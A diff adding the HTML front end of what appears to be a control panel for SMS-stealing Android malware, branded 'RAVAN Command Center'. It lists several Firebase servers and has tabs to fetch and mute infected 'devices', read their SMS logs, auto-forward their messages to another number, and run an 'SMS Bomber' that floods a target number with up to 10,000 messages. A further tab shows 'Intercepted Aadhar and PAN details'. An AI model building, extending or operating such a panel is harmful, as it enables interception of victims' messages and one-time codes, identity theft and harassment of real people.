@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="theme-color" content="#000000">
+    <title>RAVAN</title>
+    <meta name="description" content="RAVAN — Command Center">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <!-- Server Selection Modal -->
+    <div class="server-modal" id="serverModal">
+        <div class="server-modal-content">
+            <div class="server-modal-header">
+                <h2>Select Server</h2>
+                <p>Choose a Firebase server to connect to.</p>
+            </div>
+            <div class="server-list">
+                <button class="server-btn" onclick="selectServer('https://ramchandra62-51fbe-default-rtdb.firebaseio.com', 'vibe')">
+                    <div class="server-icon icon-emerald">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5" />
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name name-emerald">vibe</span>
+                    </div>
+                </button>
+                <button class="server-btn" onclick="selectServer('https://raja-rto-default-rtdb.firebaseio.com', 'king')">
+                    <div class="server-icon icon-blue">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z" />
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name name-blue">king</span>
+                    </div>
+                </button>
+                <button class="server-btn" onclick="selectServer('https://fpro-24-default-rtdb.firebaseio.com', 'aura')">
+                    <div class="server-icon icon-purple" style="color: #a855f7; background: rgba(168, 85, 247, 0.1);">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
+                            <path d="M2 12h20"></path>
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name" style="color: #a855f7; font-weight: bold;">aura</span>
+                    </div>
+                </button>
+                <button class="server-btn" onclick="selectServer('https://k-party-admin-panel-default-rtdb.firebaseio.com', 'villan')">
+                    <div class="server-icon icon-orange">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"></path>
+                            <line x1="12" y1="9" x2="12" y2="13"></line>
+                            <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name name-orange">villan</span>
+                    </div>
+                </button>
+                <button class="server-btn" onclick="selectServer('https://v068-2197f-default-rtdb.firebaseio.com', 'joy')">
+                    <div class="server-icon icon-blue">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M8 14s1.5 2 4 2 4-2 4-2"></path>
+                            <line x1="9" y1="9" x2="9.01" y2="9"></line>
+                            <line x1="15" y1="9" x2="15.01" y2="9"></line>
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name name-blue">joy</span>
+                    </div>
+                </button>
+                <button class="server-btn" onclick="selectServer('https://pachrukhi12-default-rtdb.firebaseio.com', 'paradise')">
+                    <div class="server-icon icon-emerald">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"></path>
+                            <circle cx="12" cy="10" r="3"></circle>
+                        </svg>
+                    </div>
+                    <div class="server-info">
+                        <span class="server-name name-emerald">paradise</span>
+                    </div>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Ambient Background -->
+    <div class="ambient-bg">
+        <div class="orb orb-1"></div>
+        <div class="orb orb-2"></div>
+    </div>
+
+    <!-- Status Bar -->
+    <div class="status-bar">
+        <div class="status-bar-left">
+            <span class="status-dot" id="statusDot"></span>
+            <span class="status-text" id="statusText">Ready</span>
+        </div>
+        <div class="status-bar-right" id="headerTime"></div>
+    </div>
+
+    <!-- App Header -->
+    <header class="app-header">
+        <div class="header-logo">
+            <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
+                <rect width="32" height="32" rx="9" fill="url(#lg)" />
+                <path d="M9 16L13.5 20.5L23 11" stroke="white" stroke-width="2.8" stroke-linecap="round"
+                    stroke-linejoin="round" />
+                <defs>
+                    <linearGradient id="lg" x1="0" y1="0" x2="32" y2="32">
+                        <stop stop-color="#34C759" />
+                        <stop offset="1" stop-color="#30D158" />
+                    </linearGradient>
+                </defs>
+            </svg>
+        </div>
+        <div class="header-info">
+            <h1 id="headerServerName">RAVAN 👑</h1>
+            <p>COMMAND CENTER</p>
+        </div>
+        <div class="header-actions">
+            <button class="logout-btn" onclick="logout()">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path>
+                    <polyline points="16 17 21 12 16 7"></polyline>
+                    <line x1="21" y1="12" x2="9" y2="12"></line>
+                </svg>
+            </button>
+        </div>
+    </header>
+
+    <!-- Scrollable Content Area -->
+    <main class="main-content" id="mainContent">
+
+        <!-- ===== TAB 1: BULK SENDER ===== -->
+        <section class="tab-panel active" id="panelSender">
+            <!-- Stats Row -->
+            <div class="stats-row">
+                <div class="stat-chip">
+                    <span class="stat-value" id="deviceCountVal">0</span>
+                    <span class="stat-label">Devices</span>
+                </div>
+                <div class="stat-chip stat-green">
+                    <span class="stat-value" id="onlineCountVal">0</span>
+                    <span class="stat-label">Online</span>
+                </div>
+                <div class="stat-chip stat-red">
+                    <span class="stat-value" id="mutedCountVal">0</span>
+                    <span class="stat-label">Muted</span>
+                </div>
+            </div>
+
+            <!-- Search -->
+            <div class="search-bar">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="11" cy="11" r="8" />
+                    <path d="M21 21l-4.35-4.35" />
+                </svg>
+                <input type="text" id="deviceSearch" placeholder="Search devices…" autocomplete="off">
+            </div>
+
+            <!-- Filter -->
+            <div class="filter-row">
+                <button class="pill active" data-filter="all" onclick="setDeviceFilter('all')">All</button>
+                <button class="pill" data-filter="active" onclick="setDeviceFilter('active')">Active</button>
+                <button class="pill" data-filter="muted" onclick="setDeviceFilter('muted')">Muted</button>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="action-row">
+                <button class="action-btn action-primary" onclick="fetchDevices()" id="fetchDevicesBtn">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="23 4 23 10 17 10" />
+                        <path d="M20.49 15a9 9 0 11-2.12-9.36L23 10" />
+                    </svg>
+                    Fetch
+                </button>
+                <button class="action-btn" onclick="selectAllDevices()">Select All</button>
+                <button class="action-btn action-red" onclick="toggleMuteSelected()">Mute</button>
+                <button class="action-btn" onclick="unmuteSelected()">Unmute</button>
+            </div>
+
+            <!-- Device List (card-based) -->
+            <div class="device-list" id="deviceList">
+                <div class="empty-state" id="deviceEmpty">
+                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"
+                        opacity="0.3">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
+                        <line x1="12" y1="18" x2="12.01" y2="18" />
+                    </svg>
+                    <p>No devices loaded</p>
+                    <span>Tap "Fetch" to get started</span>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- ===== TAB 2: SMS LOGS ===== -->
+        <section class="tab-panel" id="panelLogs">
+            <div class="section-header-row">
+                <h2>SMS Logs</h2>
+                <span class="badge" id="smsCountBadge">0</span>
+            </div>
+
+            <div class="action-row">
+                <button class="action-btn action-primary" onclick="fetchAllSms()" id="fetchSmsBtn">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <polyline points="23 4 23 10 17 10" />
+                        <path d="M20.49 15a9 9 0 11-2.12-9.36L23 10" />
+                    </svg>
+                    Refresh
+                </button>
+            </div>
+
+            <!-- SMS List (card-based) -->
+            <div class="sms-list" id="smsList">
+                <div class="empty-state" id="smsEmpty">
+                    <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"
+                        opacity="0.3">
+                        <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" />
+                    </svg>
+                    <p>No SMS logs</p>
+                    <span>Tap "Refresh" to fetch</span>
+                </div>
+            </div>
+
+            <!-- Pagination -->
+            <div class="pagination" id="smsPagination" style="display:none;">
+                <button class="page-btn" id="smsPrevBtn" onclick="prevSmsPage()" disabled>‹</button>
+                <span class="page-info" id="smsPageInfo">1 / 1</span>
+                <button class="page-btn" id="smsNextBtn" onclick="nextSmsPage()" disabled>›</button>
+            </div>
+
+
+        </section>
+
+        <!-- ===== TAB 3: SMS BOMBER ===== -->
+        <section class="tab-panel" id="panelBomber">
+            <!-- Bomber Hero -->
+            <div class="bomber-hero">
+                <div class="bomber-icon">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="1.8">
+                        <path d="M22 2L11 13" />
+                        <path d="M22 2L15 22L11 13L2 9L22 2Z" />
+                    </svg>
+                </div>
+                <h2>SMS Bomber</h2>
+                <p>Send repeated SMS via your devices</p>
+            </div>
+
+            <!-- Live Counter -->
+            <div class="bomber-stats">
+                <div class="stat-chip stat-green">
+                    <span class="stat-value" id="bomberSentCount">0</span>
+                    <span class="stat-label">Sent</span>
+                </div>
+                <div class="stat-chip stat-red">
+                    <span class="stat-value" id="bomberFailCount">0</span>
+                    <span class="stat-label">Failed</span>
+                </div>
+                <div class="stat-chip">
+                    <span class="stat-value" id="bomberTotalCount">0</span>
+                    <span class="stat-label">Total</span>
+                </div>
+            </div>
+
+            <!-- Mode Toggle -->
+            <div class="mode-toggle">
+                <button class="mode-btn active" data-mode="bomber" onclick="setBomberMode('bomber')">Bomber</button>
+                <button class="mode-btn" data-mode="normal" onclick="setBomberMode('normal')">Normal</button>
+            </div>
+
+            <!-- Bomber Form -->
+            <div class="form-card">
+                <label class="form-label">Target Number</label>
+                <input type="tel" id="bomberTarget" class="mobile-input" placeholder="+91XXXXXXXXXX">
+
+                <label class="form-label">Message</label>
+                <textarea id="bomberMessage" class="mobile-textarea" rows="4" placeholder="Enter message…"></textarea>
+
+                <!-- Normal Mode Settings -->
+                <div id="normalSettings" style="display:none;">
+                    <label class="form-label">Sender Device</label>
+                    <select id="normalSenderSelect" class="mobile-select">
+                        <option value="">— Select Device —</option>
+                    </select>
+                </div>
+
+                <!-- Bomber Mode Settings -->
+                <div id="bomberSettings">
+                    <label class="form-label">Repeat Count</label>
+                    <div class="stepper-row">
+                        <button class="stepper-btn" onclick="adjustBomberCount(-10)">−10</button>
+                        <button class="stepper-btn" onclick="adjustBomberCount(-1)">−</button>
+                        <input type="number" id="bomberCount" class="stepper-input" value="50" min="1" max="10000">
+                        <button class="stepper-btn" onclick="adjustBomberCount(1)">+</button>
+                        <button class="stepper-btn" onclick="adjustBomberCount(10)">+10</button>
+                    </div>
+
+                    <label class="form-label">Delay Between Messages (ms)</label>
+                    <div class="stepper-row">
+                        <button class="stepper-btn" onclick="adjustBomberDelay(-100)">−100</button>
+                        <button class="stepper-btn" onclick="adjustBomberDelay(-10)">−</button>
+                        <input type="number" id="bomberDelay" class="stepper-input" value="200" min="0" max="10000">
+                        <button class="stepper-btn" onclick="adjustBomberDelay(10)">+</button>
+                        <button class="stepper-btn" onclick="adjustBomberDelay(100)">+100</button>
+                    </div>
+
+                    <label class="form-label">Use Devices</label>
+                    <div class="bomber-device-info">
+                        <span id="bomberDeviceInfo">0 devices available</span>
+                        <span class="bomber-hint">Uses all active (non-muted) devices in rotation</span>
+                    </div>
+                </div>
+
+                <label class="form-label">SIM Slot</label>
+                <div class="sim-toggle">
+                    <button class="sim-btn active" data-slot="1" onclick="selectBomberSim(1)">SIM 1</button>
+                    <button class="sim-btn" data-slot="2" onclick="selectBomberSim(2)">SIM 2</button>
+                </div>
+
+                <!-- Progress -->
+                <div class="progress-section" id="bomberProgress" style="display:none;">
+                    <div class="progress-info">
+                        <span id="bomberProgressText">0 / 0</span>
+                        <span id="bomberProgressPercent">0%</span>
+                    </div>
+                    <div class="progress-track">
+                        <div class="progress-fill" id="bomberProgressFill"></div>
+                    </div>
+                </div>
+
+                <button class="launch-btn bomber-launch" id="bomberLaunchBtn" onclick="startBomber()">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                        stroke-width="2.5">
+                        <path d="M22 2L11 13" />
+                        <path d="M22 2L15 22L11 13L2 9L22 2Z" />
+                    </svg>
+                    START BOMBING
+                </button>
+
+                <button class="stop-btn" id="bomberStopBtn" onclick="stopBomber()" style="display:none;">
+                    STOP
+                </button>
+            </div>
+
+            <!-- Bomber Log -->
+            <div class="section-divider">
+                <span>Live Log</span>
+            </div>
+            <div class="bomber-log" id="bomberLog">
+                <div class="empty-state" id="bomberLogEmpty">
+                    <p>No activity yet</p>
+                    <span>Start bombing to see live logs</span>
+                </div>
+            </div>
+        </section>
+        <!-- ===== TAB 4: PAGES DATA ===== -->
+        <section class="tab-panel" id="panelPages">
+            <div class="section-header-row">
+                <h2>ADHAR AND PAN</h2>
+                <button class="action-btn action-primary" onclick="fetchPagesData()"
+                    style="padding:4px 8px; font-size:0.75rem;">Refresh</button>
+            </div>
+            <p style="font-size: 0.8rem; color: var(--text-3); margin-bottom: 15px;">Intercepted Aadhar and PAN details.</p>
+
+            <div id="pagesList" class="pages-list" style="display:flex; flex-direction:column; gap:12px;">
+                <div class="empty-state" id="pagesEmpty">
+                    <p>No INFO Data</p>
+                    <span>Tap "Refresh" to fetch</span>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <!-- Bottom Tab Bar (iOS style) -->
+    <nav class="bottom-nav" id="bottomNav">
+        <button class="nav-item active" data-tab="sender" onclick="switchTab('sender')">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M22 2L11 13" />
+                <path d="M22 2L15 22L11 13L2 9L22 2Z" />
+            </svg>
+            <span>Sender</span>
+        </button>
+        <button class="nav-item" data-tab="logs" onclick="switchTab('logs')">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M21 15a2 2 0 01-2 2H7l-4 4V5a2 2 0 012-2h14a2 2 0 012 2z" />
+            </svg>
+            <span>SMS</span>
+        </button>
+        <button class="nav-item" data-tab="bomber" onclick="switchTab('bomber')">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <circle cx="12" cy="12" r="10" />
+                <line x1="12" y1="8" x2="12" y2="12" />
+                <line x1="12" y1="16" x2="12.01" y2="16" />
+            </svg>
+            <span>Bomber</span>
+        </button>
+        <button class="nav-item" data-tab="pages" onclick="switchTab('pages')">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+                <line x1="16" y1="2" x2="16" y2="6" />
+                <line x1="8" y1="2" x2="8" y2="6" />
+                <line x1="3" y1="10" x2="21" y2="10" />
+            </svg>
+            <span>INFO</span>
+        </button>
+    </nav>
+
+    <!-- Device Detail Sheet (slides up from bottom) -->
+    <div class="sheet-overlay" id="deviceSheet">
+        <div class="sheet-container" id="sheetContainer">
+            <div class="sheet-handle"></div>
+
+            <div class="sheet-header">
+                <h2 id="sheetTitle">Device</h2>
+                <button class="sheet-close" onclick="closeSheet()">Done</button>
+            </div>
+            <div class="sheet-device-id" id="sheetDeviceId"></div>
+            <div class="sheet-info" id="sheetInfo">Loading…</div>
+            <div class="sheet-row" style="margin-bottom: 15px; margin-top: 10px;">
+                <button class="action-btn action-primary" style="width:100%;" onclick="fetchDeviceMoreDetails()">More
+                    Details</button>
+            </div>
+            <div id="sheetMoreDetails"
+                style="display:none; margin-bottom: 15px; padding: 10px; background: var(--bg3); border-radius: 8px; border: 1px solid var(--border);">
+            </div>
+            <!-- Send Message -->
+            <div class="sheet-section">
+                <h3>Send Message</h3>
+                <input type="tel" id="sheetPhone" class="mobile-input" placeholder="Phone number">
+                <input type="text" id="sheetMessage" class="mobile-input" placeholder="Message text">
+                <div class="sheet-row">
+                    <div class="sim-toggle sim-sm">
+                        <button class="sim-btn active" data-slot="1" onclick="selectSheetSim(1)">SIM 1</button>
+                        <button class="sim-btn" data-slot="2" onclick="selectSheetSim(2)">SIM 2</button>
+                    </div>
+                    <button class="action-btn action-primary" onclick="sendSingleMessage()">Send</button>
+                </div>
+            </div>
+
+            <!-- Forward SMS -->
+            <div class="sheet-section">
+                <h3>Auto Forward SMS</h3>
+                <input type="tel" id="sheetFwdPhone" class="mobile-input" placeholder="Forward to number">
+                <select id="sheetSenderDevice" class="mobile-select">
+                    <option value="">Sender Device</option>
+                </select>
+                <div class="sheet-row">
+                    <button class="action-btn action-primary" id="sheetFwdBtn" onclick="toggleForward()"
+                        style="flex:1">Start</button>
+                </div>
+                <div class="fwd-status" id="sheetFwdStatus"></div>
+            </div>
+
+            <!-- Device SMS -->
+            <div class="sheet-section">
+                <div class="section-header-row">
+                    <h3>Device SMS</h3>
+                    <div style="display:flex; gap:8px; align-items:center;">
+                        <button class="action-btn action-primary" style="padding:4px 8px; font-size:0.65rem;"
+                            onclick="refreshSheetSms()">Refresh</button>
+                        <span class="badge" id="sheetSmsCount">0</span>
+                    </div>
+                </div>
+                <div class="sheet-sms-list" id="sheetSmsList"></div>
+                <div class="pagination" id="sheetPagination" style="display:none;">
+                    <button class="page-btn" id="sheetSmsPrev" onclick="sheetPrevPage()" disabled>‹</button>
+                    <span class="page-info" id="sheetPageInfo">1 / 1</span>
+                    <button class="page-btn" id="sheetSmsNext" onclick="sheetNextPage()" disabled>›</button>
+                </div>
+                <!-- Sheet SMS Detail -->
+                <div class="detail-card detail-card-inline" id="sheetSmsDetail" style="display:none;">
+                    <div class="detail-card-body" id="sheetSmsDetailBody"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script src="app.js"></script>
+</body>
+
+</html>
